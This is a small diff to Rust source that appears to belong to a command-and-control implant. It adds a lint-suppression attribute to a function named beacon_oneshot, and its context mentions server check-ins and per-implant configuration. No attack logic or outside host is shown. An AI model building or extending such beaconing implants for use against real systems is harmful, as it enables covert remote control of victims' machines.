@@ -201,6 +201,7 @@ pub unsafe fn beacon_loop() {
 ///   1 = check-in succeeded (SessionInfo accepted by the server)
 ///       its response POSTed back (full round-trip)
 ///   0xC0..0xCF = a specific step failed (see inline comments)
+#[allow(unused_assignments)]
 pub unsafe fn beacon_oneshot() -> u32 {
     // Try per-implant config first, fall back to compile-time (dev path).
     let (cfg, implant, config_plain) =
